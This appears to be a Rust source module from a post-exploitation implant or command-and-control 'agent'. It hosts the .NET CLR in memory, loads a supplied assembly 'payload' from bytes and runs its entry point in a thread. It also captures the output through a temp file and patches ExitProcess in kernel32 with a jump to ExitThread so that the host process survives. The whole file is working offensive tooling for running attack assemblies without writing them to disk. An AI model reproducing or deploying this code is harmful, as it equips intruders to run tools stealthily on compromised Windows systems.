// In-memory .NET CLR hosting for the Rust agent.
//
// Same COM chain as dotnet.c: CLRCreateInstance → ICLRMetaHost::GetRuntime(v4)
// → ICLRRuntimeInfo::GetInterface(ICorRuntimeHost) → Start() →
// GetDefaultDomain() → QI(_AppDomain) → Load_3(SAFEARRAY) →
// get_EntryPoint() → Invoke_3() in a dedicated thread.
//
// ExitProcess is patched → ExitThread so Environment.Exit() doesn't kill
// the host process.

use std::mem::transmute_copy;
use std::ptr;
use std::sync::atomic::{AtomicBool, Ordering};
use windows_sys::Win32::{
    Foundation::{CloseHandle, INVALID_HANDLE_VALUE, HANDLE, MAX_PATH},
    System::{
        LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
        Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE},
        Threading::{CreateThread, ExitThread, WaitForSingleObject},
        Console::{GetStdHandle, SetStdHandle, STD_OUTPUT_HANDLE, STD_ERROR_HANDLE},
    },
};

// Raw file I/O and temp-file API — avoids windows-sys feature-path issues.
extern "system" {
    fn CreateFileW(lpFileName: *const u16, dwDesiredAccess: u32, dwShareMode: u32,
                   lpSecurityAttributes: *const core::ffi::c_void,
                   dwCreationDisposition: u32, dwFlagsAndAttributes: u32,
                   hTemplateFile: isize) -> isize;
    fn ReadFile(hFile: isize, lpBuffer: *mut u8, nNumberOfBytesToRead: u32,
                lpNumberOfBytesRead: *mut u32, lpOverlapped: *const core::ffi::c_void) -> i32;
    fn WriteFile(hFile: isize, lpBuffer: *const u8, nNumberOfBytesToWrite: u32,
                 lpNumberOfBytesWritten: *mut u32, lpOverlapped: *const core::ffi::c_void) -> i32;
    fn GetFileSize(hFile: isize, lpFileSizeHigh: *mut u32) -> u32;
    fn SetFilePointer(hFile: isize, lDistanceToMove: i32,
                      lpDistanceToMoveHigh: *mut i32, dwMoveMethod: u32) -> u32;
    fn FlushFileBuffers(hFile: isize) -> i32;
    fn GetTempPathW(nBufferLength: u32, lpBuffer: *mut u16) -> u32;
    fn GetTempFileNameW(lpPathName: *const u16, lpPrefixString: *const u16,
                        uUnique: u32, lpTempFileName: *mut u16) -> u32;
    fn DeleteFileW(lpFileName: *const u16) -> i32;
}

const GENERIC_READ:         u32 = 0x80000000;
const GENERIC_WRITE:        u32 = 0x40000000;
const FILE_SHARE_READ:      u32 = 0x00000001;
const CREATE_ALWAYS:        u32 = 2;
const FILE_ATTRIBUTE_NORMAL:u32 = 0x80;
const FILE_BEGIN:           u32 = 0;
const INVALID_FILE_SIZE:    u32 = 0xFFFFFFFF;

// ── GUID ─────────────────────────────────────────────────────────────────────

#[repr(C)]
struct Guid { d1: u32, d2: u16, d3: u16, d4: [u8; 8] }

const CLSID_CLR_META_HOST:    Guid = Guid { d1:0x9280188d, d2:0x0e8e, d3:0x4867, d4:[0xb3,0x0c,0x7f,0xa8,0x38,0x84,0xe8,0xde] };
const IID_ICLR_META_HOST:     Guid = Guid { d1:0xd332db9e, d2:0xb9b3, d3:0x4125, d4:[0x82,0x07,0xa1,0x48,0x84,0xf5,0x32,0x16] };
const IID_ICLR_RUNTIME_INFO:  Guid = Guid { d1:0xbd39d1d2, d2:0xba2f, d3:0x486a, d4:[0x89,0xb0,0xb4,0xb0,0xcb,0x46,0x68,0x91] };
const CLSID_COR_RUNTIME_HOST: Guid = Guid { d1:0xcb2f6723, d2:0xab3a, d3:0x11d2, d4:[0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e] };
const IID_ICOR_RUNTIME_HOST:  Guid = Guid { d1:0xcb2f6722, d2:0xab3a, d3:0x11d2, d4:[0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e] };
const IID_APP_DOMAIN:         Guid = Guid { d1:0x05f696dc, d2:0x2b29, d3:0x3663, d4:[0xad,0x8b,0xc4,0x38,0x9c,0xf2,0xa7,0x13] };

// ── VARIANT (x64 = 16 bytes) ──────────────────────────────────────────────────

#[repr(C)]
struct OleVar { vt: u16, r1: u16, r2: u16, r3: u16, data: u64 }

const VT_UI1:  u16 = 17;
const VT_BSTR: u16 = 8;
const VT_ARRAY: u16 = 0x2000;

// ── vtable accessor ───────────────────────────────────────────────────────────

unsafe fn vt<F: Copy>(obj: *mut u8, idx: usize) -> F {
    let vtbl = *(obj as *const *const usize);
    transmute_copy(&*vtbl.add(idx))
}

// ── SafeArray dynamic load ────────────────────────────────────────────────────

type FnSaCV = unsafe extern "system" fn(u16, i32, u32) -> *mut u8;
type FnSaAD = unsafe extern "system" fn(*mut u8, *mut *mut u8) -> i32;
type FnSaUA = unsafe extern "system" fn(*mut u8) -> i32;
type FnSaPE = unsafe extern "system" fn(*mut u8, *const i32, *const u8) -> i32;
type FnSaDe = unsafe extern "system" fn(*mut u8) -> i32;
type FnSAS  = unsafe extern "system" fn(*const u16) -> *mut u16;
type FnSFS  = unsafe extern "system" fn(*mut u16);

struct OleAut32 {
    sa_cv: FnSaCV, sa_ad: FnSaAD, sa_ua: FnSaUA,
    sa_pe: FnSaPE, sa_de: FnSaDe,
    sas: FnSAS, sfs: FnSFS,
}

unsafe fn gpa<F: Copy>(h: isize, name: &[u8]) -> Option<F> {
    let p = GetProcAddress(h, name.as_ptr())?;
    Some(transmute_copy(&p))
}

unsafe fn load_oleaut32() -> Option<OleAut32> {
    let h = LoadLibraryA(b"oleaut32.dll\0".as_ptr());
    if h == 0 { return None; }
    Some(OleAut32 {
        sa_cv: gpa(h, b"SafeArrayCreateVector\0")?,
        sa_ad: gpa(h, b"SafeArrayAccessData\0")?,
        sa_ua: gpa(h, b"SafeArrayUnaccessData\0")?,
        sa_pe: gpa(h, b"SafeArrayPutElement\0")?,
        sa_de: gpa(h, b"SafeArrayDestroy\0")?,
        sas:   gpa(h, b"SysAllocString\0")?,
        sfs:   gpa(h, b"SysFreeString\0")?,
    })
}

unsafe fn bytes_to_sa(oa: &OleAut32, data: &[u8]) -> *mut u8 {
    let sa = (oa.sa_cv)(VT_UI1, 0, data.len() as u32);
    if sa.is_null() { return ptr::null_mut(); }
    let mut pv: *mut u8 = ptr::null_mut();
    (oa.sa_ad)(sa, &mut pv);
    if !pv.is_null() { ptr::copy_nonoverlapping(data.as_ptr(), pv, data.len()); }
    (oa.sa_ua)(sa);
    sa
}

unsafe fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

unsafe fn args_to_param_sa(oa: &OleAut32, args: &str) -> *mut u8 {
    let parts: Vec<&str> = if args.is_empty() { vec![] } else { args.split_whitespace().collect() };
    let inner = (oa.sa_cv)(VT_BSTR, 0, parts.len() as u32);
    if inner.is_null() { return ptr::null_mut(); }
    for (i, p) in parts.iter().enumerate() {
        let wide = to_wide(p);
        let bstr = (oa.sas)(wide.as_ptr());
        let idx = i as i32;
        (oa.sa_pe)(inner, &idx, bstr as *const u8);
        (oa.sfs)(bstr);
    }
    let outer = (oa.sa_cv)(12, 0, 1);  // VT_VARIANT = 12
    if outer.is_null() { (oa.sa_de)(inner); return ptr::null_mut(); }
    let elem = OleVar { vt: VT_ARRAY | VT_BSTR, r1:0, r2:0, r3:0, data: inner as u64 };
    let idx0 = 0i32;
    (oa.sa_pe)(outer, &idx0, &elem as *const OleVar as *const u8);
    (oa.sa_de)(inner);
    outer
}

// ── Stdout redirect ───────────────────────────────────────────────────────────

unsafe fn redirect_stdout() -> (HANDLE, Vec<u16>, HANDLE, HANDLE) {
    let orig_out = GetStdHandle(STD_OUTPUT_HANDLE);
    let orig_err = GetStdHandle(STD_ERROR_HANDLE);
    let mut tmp_dir = vec![0u16; MAX_PATH as usize];
    GetTempPathW(MAX_PATH, tmp_dir.as_mut_ptr());
    let mut tmp_path = vec![0u16; MAX_PATH as usize];
    let prefix = to_wide("clr");
    GetTempFileNameW(tmp_dir.as_ptr(), prefix.as_ptr(), 0, tmp_path.as_mut_ptr());
    let fh = CreateFileW(
        tmp_path.as_ptr(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ,
        ptr::null(), CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0,
    );
    if fh != INVALID_HANDLE_VALUE {
        SetStdHandle(STD_OUTPUT_HANDLE, fh);
        SetStdHandle(STD_ERROR_HANDLE, fh);
    }
    (fh, tmp_path, orig_out, orig_err)
}

unsafe fn read_temp_file(fh: HANDLE, tmp_path: &[u16]) -> String {
    let size = GetFileSize(fh, ptr::null_mut());
    if size == 0 || size == INVALID_FILE_SIZE {
        CloseHandle(fh);
        DeleteFileW(tmp_path.as_ptr());
        return "(no output)".into();
    }
    let mut buf = vec![0u8; size as usize];
    SetFilePointer(fh, 0, ptr::null_mut(), FILE_BEGIN);
    let mut rd = 0u32;
    ReadFile(fh, buf.as_mut_ptr(), size, &mut rd, ptr::null());
    buf.truncate(rd as usize);
    CloseHandle(fh);
    DeleteFileW(tmp_path.as_ptr());
    String::from_utf8_lossy(&buf).into_owned()
}

// ── ExitProcess hook → ExitThread ────────────────────────────────────────────

static EP_HOOKED: AtomicBool = AtomicBool::new(false);
static mut EP_ORIG: [u8; 12] = [0u8; 12];
static mut EP_ADDR: *mut u8 = ptr::null_mut();

unsafe extern "system" fn ep_stub(code: u32) { ExitThread(code); }

unsafe fn install_exit_hook() {
    if EP_HOOKED.swap(true, Ordering::SeqCst) { return; }
    let k32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr());
    if k32 == 0 { return; }
    let addr = match GetProcAddress(k32, b"ExitProcess\0".as_ptr()) {
        Some(f) => f as *mut u8, None => return,
    };
    EP_ADDR = addr;
    let stub = ep_stub as usize as u64;
    let mut jmp = [0u8; 12];
    jmp[0] = 0x48; jmp[1] = 0xB8;
    jmp[2..10].copy_from_slice(&stub.to_le_bytes());
    jmp[10] = 0xFF; jmp[11] = 0xE0;
    let mut old = 0u32;
    VirtualProtect(EP_ADDR as _, 12, PAGE_EXECUTE_READWRITE, &mut old);
    ptr::copy_nonoverlapping(EP_ADDR, EP_ORIG.as_mut_ptr(), 12);
    ptr::copy_nonoverlapping(jmp.as_ptr(), EP_ADDR, 12);
    VirtualProtect(EP_ADDR as _, 12, old, &mut old);
}

unsafe fn remove_exit_hook() {
    if !EP_HOOKED.swap(false, Ordering::SeqCst) { return; }
    if EP_ADDR.is_null() { return; }
    let mut old = 0u32;
    VirtualProtect(EP_ADDR as _, 12, PAGE_EXECUTE_READWRITE, &mut old);
    ptr::copy_nonoverlapping(EP_ORIG.as_ptr(), EP_ADDR, 12);
    VirtualProtect(EP_ADDR as _, 12, old, &mut old);
}

// ── Invoke_3 thread ───────────────────────────────────────────────────────────

struct InvokeArgs { ep: *mut u8, sa_params: *mut u8, hr: i32 }
unsafe impl Send for InvokeArgs {}

unsafe extern "system" fn invoke_thread(param: *mut core::ffi::c_void) -> u32 {
    let w = &mut *(param as *mut InvokeArgs);
    type FnInv = unsafe extern "system" fn(*mut u8, *const OleVar, *mut u8, *mut OleVar) -> i32;
    let fn_ptr: FnInv = vt(w.ep, 37);
    let obj_v = OleVar { vt:0, r1:0, r2:0, r3:0, data:0 };
    let mut ret_v = OleVar { vt:0, r1:0, r2:0, r3:0, data:0 };
    w.hr = fn_ptr(w.ep, &obj_v, w.sa_params, &mut ret_v);
    0
}

// ── Public entry ──────────────────────────────────────────────────────────────

pub fn exec_dotnet(asm_bytes: &[u8], args: &str) -> String {
    if asm_bytes.len() < 2 { return "[!] dotnet_exec: empty payload".into(); }
    unsafe {
        let Some(oa) = load_oleaut32() else {
            return "[!] dotnet_exec: oleaut32.dll load failed".into();
        };
        let hms = LoadLibraryA(b"mscoree.dll\0".as_ptr());
        if hms == 0 { return "[!] dotnet_exec: mscoree.dll not found".into(); }
        type FnCI = unsafe extern "system" fn(*const Guid, *const Guid, *mut *mut u8) -> i32;
        let clr_ci: FnCI = match gpa(hms, b"CLRCreateInstance\0") {
            Some(f) => f, None => return "[!] dotnet_exec: CLRCreateInstance not found".into(),
        };

        // ICLRMetaHost
        let mut p_mh: *mut u8 = ptr::null_mut();
        if clr_ci(&CLSID_CLR_META_HOST, &IID_ICLR_META_HOST, &mut p_mh) < 0 || p_mh.is_null() {
            return "[!] dotnet_exec: CLRCreateInstance failed".into();
        }

        // GetRuntime(v4) vtbl[3]
        type FnGR = unsafe extern "system" fn(*mut u8, *const u16, *const Guid, *mut *mut u8) -> i32;
        let ver = to_wide("v4.0.30319");
        let mut p_rti: *mut u8 = ptr::null_mut();
        let gr: FnGR = vt(p_mh, 3);
        if gr(p_mh, ver.as_ptr(), &IID_ICLR_RUNTIME_INFO, &mut p_rti) < 0 || p_rti.is_null() {
            return "[!] dotnet_exec: GetRuntime failed".into();
        }

        // GetInterface → ICorRuntimeHost  vtbl[9]
        type FnGI = unsafe extern "system" fn(*mut u8, *const Guid, *const Guid, *mut *mut u8) -> i32;
        let mut p_ch: *mut u8 = ptr::null_mut();
        let gi: FnGI = vt(p_rti, 9);
        if gi(p_rti, &CLSID_COR_RUNTIME_HOST, &IID_ICOR_RUNTIME_HOST, &mut p_ch) < 0 || p_ch.is_null() {
            return "[!] dotnet_exec: GetInterface failed".into();
        }

        // Start()  vtbl[10]
        type FnV = unsafe extern "system" fn(*mut u8) -> i32;
        let start: FnV = vt(p_ch, 10);
        let hr_start = start(p_ch);
        if hr_start < 0 && hr_start != 1 {
            return "[!] dotnet_exec: Start failed".into();
        }

        // GetDefaultDomain  vtbl[13]
        type FnGDD = unsafe extern "system" fn(*mut u8, *mut *mut u8) -> i32;
        let mut p_dom: *mut u8 = ptr::null_mut();
        let gdd: FnGDD = vt(p_ch, 13);
        if gdd(p_ch, &mut p_dom) < 0 || p_dom.is_null() {
            return "[!] dotnet_exec: GetDefaultDomain failed".into();
        }

        // QI → _AppDomain  IUnknown vtbl[0]
        type FnQI = unsafe extern "system" fn(*mut u8, *const Guid, *mut *mut u8) -> i32;
        let mut p_ad: *mut u8 = ptr::null_mut();
        let qi: FnQI = vt(p_dom, 0);
        if qi(p_dom, &IID_APP_DOMAIN, &mut p_ad) < 0 || p_ad.is_null() {
            return "[!] dotnet_exec: QI _AppDomain failed".into();
        }

        let sa_asm = bytes_to_sa(&oa, asm_bytes);
        if sa_asm.is_null() { return "[!] dotnet_exec: bytes_to_sa failed".into(); }

        // Load_3  vtbl[44] or [45]
        type FnL3 = unsafe extern "system" fn(*mut u8, *mut u8, *mut *mut u8) -> i32;
        let mut p_asm: *mut u8 = ptr::null_mut();
        let load3_44: FnL3 = vt(p_ad, 44);
        let mut hr = load3_44(p_ad, sa_asm, &mut p_asm);
        if hr < 0 || p_asm.is_null() {
            p_asm = ptr::null_mut();
            let load3_45: FnL3 = vt(p_ad, 45);
            hr = load3_45(p_ad, sa_asm, &mut p_asm);
        }
        if hr < 0 || p_asm.is_null() {
            return format!("[!] dotnet_exec: Load_3 failed hr=0x{:08X}", hr as u32);
        }

        // get_EntryPoint  vtbl[16]
        type FnGEP = unsafe extern "system" fn(*mut u8, *mut *mut u8) -> i32;
        let mut p_ep: *mut u8 = ptr::null_mut();
        let gep: FnGEP = vt(p_asm, 16);
        if gep(p_asm, &mut p_ep) < 0 || p_ep.is_null() {
            return "[!] dotnet_exec: get_EntryPoint failed".into();
        }

        let sa_params = args_to_param_sa(&oa, args);
        let (fh_tmp, tmp_path, orig_out, orig_err) = redirect_stdout();

        let mut work = InvokeArgs { ep: p_ep, sa_params: sa_params, hr: 0 };
        install_exit_hook();
        let ht = CreateThread(ptr::null(), 0, Some(invoke_thread),
            &mut work as *mut _ as _, 0, ptr::null_mut());
        if ht != 0 {
            WaitForSingleObject(ht, 60_000);
            CloseHandle(ht);
        }
        remove_exit_hook();

        SetStdHandle(STD_OUTPUT_HANDLE, orig_out);
        SetStdHandle(STD_ERROR_HANDLE, orig_err);
        if !sa_params.is_null() { (oa.sa_de)(sa_params); }

        if fh_tmp == INVALID_HANDLE_VALUE { return "(no output captured)".into(); }
        FlushFileBuffers(fh_tmp);
        read_temp_file(fh_tmp, &tmp_path)
    }
}
